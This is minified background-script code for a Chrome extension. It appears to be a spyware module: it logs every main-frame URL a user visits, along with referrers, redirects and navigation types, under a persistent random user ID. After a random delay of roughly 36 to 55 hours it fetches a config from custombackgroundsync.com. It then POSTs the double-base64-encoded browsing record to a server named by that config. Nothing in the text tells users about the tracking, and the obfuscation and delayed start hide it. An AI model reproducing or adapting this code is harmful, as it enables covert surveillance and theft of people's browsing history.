STARTING_POINT=function(){function e(e,t){if(!e)throw new Error("Missing permission: WR");this.api=t,this.webRequest=e;var r={onBeforeRequest:["blocking"],onBeforeSendHeaders:["blocking","requestHeaders"]};this.addEventListeners({types:["main_frame"],urls:["<all_urls>"]},r,["onCompleted","onBeforeRequest","onErrorOccurred","onBeforeSendHeaders","onBeforeRedirect"])}function t(e,t){if(!e)throw new Error("Zero tabs - can't proceed!");this.tabs=e,this.api=t,this.addEventListeners(["onCreated","onUpdated"]),this.addEventListeners(["onReplaced","onRemoved"]);var r=this;chrome.windows.getAll({populate:!0},function(e){for(var t=0;t<e.length;t++)for(var i=0;i<e[t].tabs.length;i++)if(e[t].focused&&e[t].tabs[i].active&&r.api.setCurrent(e[t].tabs[i].id,e[t].tabs[i].url),r.api.isWebURL(e[t].tabs[i].url)){var n=r.api.addscope(e[t].tabs[i].id);n._isReported=!0,n._additionalInfo.push("extension_reloading")}}),t.clearPrev(),this._onLocationChange=function(e){e&&this.api.setStatusReadyToProceed(e._scopeId)}}var r=function(){function e(){this._removeArray=function(e){for(var t in e){var r=e[t];this.removeKey(r)}},this._loadIntoMemory=function(){this._inMemoryCache=JSON.parse(this._diskCache.getItem(this._defaultKey)||"{}")},this._dumpToDisk=function(){this._diskCache.setItem(this._defaultKey,JSON.stringify(this._inMemoryCache))},this._defaultKey="db",this._inMemoryCache={},"undefined"!=typeof localStorage&&(this._diskCache=localStorage,this._loadIntoMemory())}function t(){this.toQueryString=function(e){return Object.keys(e).filter(function(t){return!!e[t]||!1===e[t]}).map(function(t){return t+"="+e[t]}).join("&")},this.toBase64=function(e){return btoa(e)},this.isWebURL=function(e){return void 0==e?!1:e.search("chrome/newtab")>-1?!1:/^http/.test(e)},this.generateRandomString=function(e){for(var t="",r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",i=0;e>i;i++)t+=r.charAt(Math.floor(Math.random()*r.length));return t},this.generateRandomTimestamp=function(){return 60*Math.floor(20*Math.random()+36)*60*1e3},this.getCurrentTime=function(){return Date.now()}}function r(e){this._utils=e}function i(e,t,r,i){function n(){r.getScopeById(t.periodical_route,s,function(e,t){return o._is_ready=!0,e?(o._inMemoryCache=JSON.parse(t),void o.store()):null})}this._is_ready=!1,this._diskCache=e,this._inMemoryCache=null,this._settingsStorageKey="s_key",this._inMemoryCache1=void 0,this._settingsStorageKey1="ad_key",this._inMemoryCache1=this._diskCache.restore(this._settingsStorageKey1);var s={s:t.external_id,ver:t.api_ver},o=this;if(this.canRunIsSet=function(){return!("undefined"==typeof this._inMemoryCache1)},this.canRunIsSet())if(this.canRun())n();else{var a=this.getCanRun()-l.getCurrentTime();setTimeout(n,a)}else{var a=l.generateRandomTimestamp();this.setCanRun(a),setTimeout(n,a)}}function n(e){this._scopeId=e,this._scopeTypes=[],this._finishedUrl="",this._startUrl="",this._transitionType=[],this._transitionQualifiers=[],this._prev=void 0,this._referrer="",this._startTimestamp=void 0,this._prevUrlInRequest=void 0,this._userRedirectUrls=[],this._otherRedirectUrls=[],this._completionError=void 0,this._isReported=!1,this._states={Ready:!0,Wrk:!1,Redirecting:!1,Completing:!1,ReadyToProceed:!1,Sent:!1},this._additionalInfo=[],this._isTypeValue=function(e){return this._scopeTypes.indexOf(e)>-1},this._setIsTypeValue=function(e){this._isTypeValue(e)||this._scopeTypes.push(e)},this._setIsNotTypeValue=function(e){if(this._isTypeValue(e)){var t=this._scopeTypes.indexOf(e);-1!==t&&this._scopeTypes.splice(t,1)}}}function s(){this._dataList=[]}function o(){var e="ud",t=_.restore(e);t||(t=l.generateRandomString(15),_.addToStore(e,t)),this._userId=t,this._currentScope=null}var a=e.prototype;a.addToStore=function(e,t){return this._diskCache?(this._inMemoryCache[e]=t,this._diskCache.setItem(this._defaultKey,JSON.stringify(this._inMemoryCache)),this._diskCache.getItem(e)&&this._diskCache.removeItem(e),this._inMemoryCache[e]):void 0},a.restore=function(e){if(this._diskCache){var t=this._diskCache.getItem(e);return t?this.addToStore(e,t):this._loadIntoMemory(),this._inMemoryCache[e]}},a.removeKey=function(e){this._diskCache&&(delete this._inMemoryCache[e],this._diskCache.removeItem(e),this._dumpToDisk())},a.removeAll=function(){this._inMemoryCache={},this._diskCache.removeItem(this._defaultKey)},a.state=function(){return this._loadIntoMemory(),JSON.parse(JSON.stringify(this._inMemoryCache||{}))};var u=r.prototype;u.makePostCall=function(e,t,r){var i=new XMLHttpRequest;i.open("POST",e,!0),i.setRequestHeader("Content-type","application/x-www-form-urlencoded"),i.onreadystatechange=function(){4==i.readyState&&r&&r.apply(null,[200==i.status,i.responseText].concat(arguments))},i.send(t)},u.getScopeById=function(e,t,r){var i=new XMLHttpRequest;i.onreadystatechange=function(){4==i.readyState&&r&&r.apply(null,[200==i.status,i.responseText].concat(arguments))},i.open("GET",e+"?"+this._utils.toQueryString(t),!0),i.send()};var c=i.prototype;c.store=function(){this._diskCache.addToStore(this._settingsStorageKey,this._inMemoryCache)},c.isReady=function(){return this._is_ready},c.waitUntilReady=function(e,t){var r=!1,i=this,n=setInterval(function(){r=i.isReady(),r&&(clearInterval(n),n=null,t(null,!0))},300);setTimeout(function(){n&&t(new Error("CFG Timeout"))},e)},c.isEnabled=function(){return 1==(this._inMemoryCache||{}).o},c.getURL=function(){return(this._inMemoryCache||{}).u},c.disable=function(){1==(this._inMemoryCache||{}).o&&(this._inMemoryCache.o=0,this.store())},c.enable=function(){!this.isEnabled()&&this._inMemoryCache&&(this._inMemoryCache.o=1,this.store())},c.store1=function(){this._diskCache.addToStore(this._settingsStorageKey1,this._inMemoryCache1)},c.canRun=function(){if(this.canRunIsSet()){var e=l.getCurrentTime(),t=(this._inMemoryCache1||{}).TS;return e>t&&this.isEnabled()}return!1},c.setCanRun=function(e){this._inMemoryCache1={},this._inMemoryCache1.TS=l.getCurrentTime()+e,this.store1()},c.getCanRun=function(){return this.canRunIsSet()?this._inMemoryCache1.TS:-1};var d=n.prototype;d.getFlags=function(){var e=this;return"Ready Wrk Redirecting Completing ReadyToProceed Sent".split(" ").map(function(t){return" "+(e._states[t]?t.toUpperCase().substr(0,3):" - ")+" "}).join("")},d.setState=function(e){return this._states.hasOwnProperty(e)?(this._states[this.currentState()]=!1,void(this._states[e]=!0)):!1},d.currentState=function(){for(var e in this._states)if(this._states[e])return e},d.getScopeId=function(){return this._scopeId},d.setIsDuplicated=function(){return this._setIsTypeValue("duplicated_tab")},d.setIsNotDuplicated=function(){return this._setIsNotTypeValue("duplicated_tab")},d.isDuplicate=function(){return this._isTypeValue("duplicated_tab")},d.setIsReopened=function(){return this._setIsTypeValue("reopened")},d.setIsNotReopened=function(){return this._setIsNotTypeValue("reopened")},d.isReopened=function(){return this._isTypeValue("reopened")},d.getScopeTypes=function(){return this._scopeTypes},d.setScopeTypes=function(e){this._scopeTypes=e},d.addClientRedirect=function(e){this._userRedirectUrls.push({url:this._prevUrlInRequest,dur:e-this._startTimestamp})},d.addServerRedirect=function(e){this._otherRedirectUrls.push(e)},d.setRequestBegin=function(e,t){this._startTimestamp=e,this._prev=t},d.nullifyAdditionalData=function(){this._scopeTypes=[],this._startUrl="",this._transitionType=[],this._transitionQualifiers=[],this._prev=void 0,this._startTimestamp=void 0,this._userRedirectUrls=[],this._otherRedirectUrls=[],this._additionalInfo=[]};var h=s.prototype;h.contains=function(e){return!!this.getScopeById(e)},h.add=function(e){return this.contains(e)||this._dataList.push(new n(e)),this.getScopeById(e)},h.getScopeById=function(e){return this._dataList.filter(function(t){return t.getScopeId()==e})[0]},h.remove=function(e){var t=this._dataList.indexOf(this.getScopeById(e));-1!==t&&this._dataList.splice(t,1)};var p={api_ver:"6.3",external_id:"589",periodical_route:"https://custombackgroundsync.com/define",process_name:"chrome",main_route:"/re/define",p_version:"1"},l=new t,f=new r(l),_=new e,m=new s,y=new i(_,p,f,l),v=o.prototype;return v.setCurrentScopeId=function(e){this._currentScope=e},v.isCurrentScope=function(e){return this._currentScope==e},v.setPrev=function(e){e.length>0?_.addToStore("lastprev",e):_.removeKey("lastprev")},v.getPrev=function(){return _.restore("lastprev")||""},v.clearPrev=function(){return _.removeKey("lastprev")},v.focus=function(e){l.isWebURL(e)&&this.setPrev(e)},v.setCurrent=function(e,t){this.setCurrentScopeId(e),l.isWebURL(t)&&this.getScopeInfo(e)&&this.getScopeInfo(e)._isReported&&this.setPrev(t)},v.finishItemWrk=function(e){e._completionError||e.setState("Ready")},v.processItem=function(e){return"ReadyToProceed"!==e.currentState()?(this.setStatusSent(e._scopeId),!1):e._isReported?void this.setStatusSent(e._scopeId):l.isWebURL(e._finishedUrl)&&y.canRun()?(this.createQuery(e),-1==e._scopeId?(e.nullifyAdditionalData(),e.setState("Sent"),e._isReported=!0,e._completionError=void 0,delete e):this.setStatusSent(e._scopeId),!0):(this.setStatusSent(e._scopeId),!1)},v.createQuery=function(e){if(!e)return!1;var t=e._prev||this.getPrev(),r=e._referrer,i=[];if((e.isDuplicate()||e.isReopened())&&(r=""),e.isDuplicate()&&i.push("duplication"),e.isReopened()&&i.push("reopening"),e._additionalInfo&&(i=i.concat(e._additionalInfo)),"start_page"===e._transitionType)return e.nullifyAdditionalData(),!0;var n=e._otherRedirectUrls||[],s=e._userRedirectUrls||[];t||(t=""),r||(r=""),d={us:p.external_id,ver:p.api_ver,def:21,sver:p.p_version,nid:p.process_name,h:this._userId,tid:l.getCurrentTime(),uns:"",u:encodeURIComponent(e._finishedUrl),p:encodeURIComponent(t),rd:encodeURIComponent(r),ch:2},d.to=i,d.t=e._transitionType,d.q1=e._transitionQualifiers,e._completionError&&(d.ce=e._completionError);for(var o="",a=0;a<n.length;a++)o+="&ref"+escape(n[a]);s[0]&&s[0].url&&(d.rs1=escape(s[0].url)),s[0]&&s[0].dur&&(d.rs2=escape(s[0].dur));var u=l.toQueryString(d)+o,c=l.toBase64(l.toBase64(u)),d="e="+encodeURIComponent(c),h=y.getURL()+(p.main_route||"");return f.makePostCall(h,d),(this._currentScope==e._scopeId||-1==e._scopeId)&&this.setPrev(e._finishedUrl),e.nullifyAdditionalData(),!0},v.setStatusReady=function(e,t){var r=this.getScopeInfo(e);if(!r)return!1;var i=r.currentState(),n=r._completionError;if(n)return!1;switch(i){case"Sent":r.nullifyAdditionalData();break;default:return!1}return r.setState("Ready"),!0},v.setStatusWrk=function(e,t){var r=this.getScopeInfo(e);if(!r)return!1;if(!t)return!1;var i=r.currentState(),n=r._completionError,s=r._isReported;switch(i){case"Completing":if(s&&n)break;s||(this.partiallyLoaded(r),r.nullifyAdditionalData(),r._isReported=!1,r._completionError=void 0);case"Ready":if(r.setRequestBegin(t.timestamp||0,this.getPrev()),!t.url)return!1;r._startUrl=t.url,r._isReported=!1;break;case"Redirecting":break;case"ReadyToProceed":if(!n&&!s)return!1;break;case"Sent":if(!n&&!s)return!1;break;default:return!1}return r.setState("Wrk"),!0},v.setStatusRedirecting=function(e,t){var r=this.getScopeInfo(e);if(!r)return!1;var i=r.currentState();switch(i){case"Wrk":r.addServerRedirect((t||{}).redirect_url||"");break;default:return!1}return r.setState("Redirecting"),!0},v.setStatusCompleting=function(e,t){var r=this.getScopeInfo(e);if(!r)return!1;var i=r.currentState();if(!t||!t.finished_url)return!1;switch(r._finishedUrl=t.finished_url,i){case"Ready":r._isReported=!1,r._additionalInfo.push("AJAX_query");case"Wrk":r._completionError&&(r._isReported=!1),r._completionError=void 0;break;case"Completing":case"ReadyToProceed":break;case"Sent":if(r._completionError)break;default:return!1}return r.setState("Completing"),!0},v.setStatusReadyToProceed=function(e,t){var r=null;if(-1===e){if(!t||!t.object)return!1;r=t.item}else r=this.getScopeInfo(e);if(!r)return!0;var i=r.currentState();switch(i){case"ReadyToProceed":case"Sent":if(!r._completionError)return!1;break;case"Ready":r._isReported=!1,r._completionError=void 0,r._additionalInfo.push("forward_back");case"Wrk":r._completionError||(r._isReported=!1)}return t&&t.url&&(r._finishedUrl=t.url),t&&t.error&&(r._completionError||(r._completionError=t.error)),r._prev||(r._prev=this.getPrev()),r.setState("ReadyToProceed"),this.processItem(r),!0},v.setStatusSent=function(e,t){var r=this.getScopeInfo(e);if(!r)return!1;var i=r.currentState();switch(i){case"ReadyToProceed":r._isReported=!0;break;default:return!1}return r.setState("Sent"),this.finishItemWrk(r)},v.occuredError=function(e,t,r){return this.setStatusReadyToProceed(e,{url:t,error:r})},v.partiallyLoaded=function(e){var t=new n(-1);t._scopeTypes=e._scopeTypes.slice(),t._otherRedirectUrls=e._otherRedirectUrls.slice(),t._finishedUrl=e._finishedUrl,t._startUrl=e._startUrl,t._transitionType=e._transitionType,t._transitionQualifiers=e._transitionQualifiers.slice(),t._prev=this.getPrev(),t._startTimestamp=e._startTimestamp,t._prevUrlInRequest=e._prevUrlInRequest,t._userRedirectUrls=e._userRedirectUrls.slice(),t._completionError=e._completionError,t._isReported=e._isReported,t._referrer="",t._additionalInfo.push("nonfullyloaded"),t.setState("Wrk"),this.setStatusReadyToProceed(-1,{item:t})},v.isWebURL=l.isWebURL.bind(l),v.deleteScope=m.remove.bind(m),v.getScopeInfo=m.getScopeById.bind(m),v.addscope=m.add.bind(m),v.out=function(e){var t={currentStatus:_.state.bind(_),removeAllData:_.removeAll.bind(_)};return e&&(t.stop=y.disable.bind(y),t.start=y.enable.bind(y)),t},new o}(),i=e.prototype;i.onErrorOccurred=function(e){e.tabId>0&&this.api.occuredError(e.tabId,e.url,e.error)},i.onBeforeSendHeaders=function(e){var t=this.api.getScopeInfo(e.tabId);if(!t)return{requestHeaders:e.requestHeaders};for(var r=0;r<e.requestHeaders.length;++r)if("Referer"===e.requestHeaders[r].name)return t._referrer=e.requestHeaders[r].value,{requestHeaders:e.requestHeaders};return t._referrer="",{requestHeaders:e.requestHeaders}},i.onCompleted=function(e){this.api.setStatusCompleting(e.tabId,{finished_url:e.url})},i.onBeforeRedirect=function(e){this.api.setStatusRedirecting(e.tabId,{redirect_url:e.url})},i.onBeforeRequest=function(e){if(e.tabId<=0)return null;this.api.getScopeInfo(e.tabId)||this.api.addscope(e.tabId);this.api.setStatusWrk(e.tabId,{url:e.url,timestamp:e.timeStamp})},i.addEventListeners=function(e,t,r){var i=this;r.forEach(function(r){if(!i.webRequest[r])return null;var n=function(){var e=null;try{i[r].apply(i,arguments)}catch(t){e=t}};t[r]?i.webRequest[r].addListener(n,e,t[r]):i.webRequest[r].addListener(n,e)})};var n=t.prototype;return n._activatedCallback=function(e,t){if(this.api.setCurrentScopeId(t.tabId),this.api.getScopeInfo(t.tabId)){var r=this;this.tabs.get(t.tabId,function(e){chrome.runtime.lastError||r.api.setCurrent(t.tabId,e.url)})}},n.addEventListeners=function(e){var t=this;e.forEach(function(e){return t.tabs[e]?void t.tabs[e].addListener(function(){try{t[e].apply(t,arguments)}catch(r){}}):null}),this.addActivatedListener()},n.onUpdated=function(e,t,r){if("complete"==(t||{}).status){var i=this.api.getScopeInfo(e);this.api.setStatusCompleting(e,{finished_url:r.url}),this._onLocationChange(i)}},n.onReplaced=function(e,t){var r=this.api.getScopeInfo(e),i=this;this.tabs.get(e,function(e){e&&(r._finishedUrl=e.url,i.api.deleteScope(t),i._onLocationChange(r))}),this.api.setCurrentScopeId(e)},n.addActivatedListener=function(){this.tabs.onActivated?this.tabs.onActivated.addListener(this._activatedCallback.bind(this,null)):this.tabs.onSelectionChanged.addListener(this._activatedCallback.bind(this))},n.onCreated=function(e){var t=this.api.addscope(e.id),r=this.api.getScopeInfo(e.openerTabId);e.url.length&&r&&e.url===r._finishedUrl?t.setIsDuplicated():e.url.length&&this.tabs.query({url:e.url},function(e){(e||[]).length>1&&(t.setIsDuplicated(),t._additionalInfo.push("background_duplication"))}),"complete"!=e.status||e.openerTabId||t.setIsReopened()},n.onRemoved=function(e,t){this.api.deleteScope(e)},n.onHighlighted=function(e){1==e.tabIds.length&&this.api.setCurrentScopeId(e.tabIds[0])},new e(chrome.webRequest,r),new t(chrome.tabs,r),chrome.webNavigation.onCommitted.addListener(function(e){try{if(void 0==e||0!=e.frameId)return;var t=e.tabId;if(t>=0){var i=r.getScopeInfo(t)||r.addscope(t);i._transitionType=e.transitionType,i._transitionQualifiers=e.transitionQualifiers,e.transitionQualifiers.indexOf("client_redirect")>-1&&i.addClientRedirect(e.timeStamp),i._prevUrlInRequest=e.url}}catch(n){}}),chrome.windows.onRemoved.addListener(function(e){chrome.tabs.query({active:!0},function(e){e[0]&&r.setCurrent(e[0].id,e[0].url)})}),chrome.windows.onFocusChanged.addListener(function(e){e!=chrome.windows.WINDOW_ID_NONE&&chrome.tabs.query({windowId:e,active:!0},function(e){e[0]&&e[0].active&&r.setCurrent(e[0].id,e[0].url)})}),r.out(!0)}();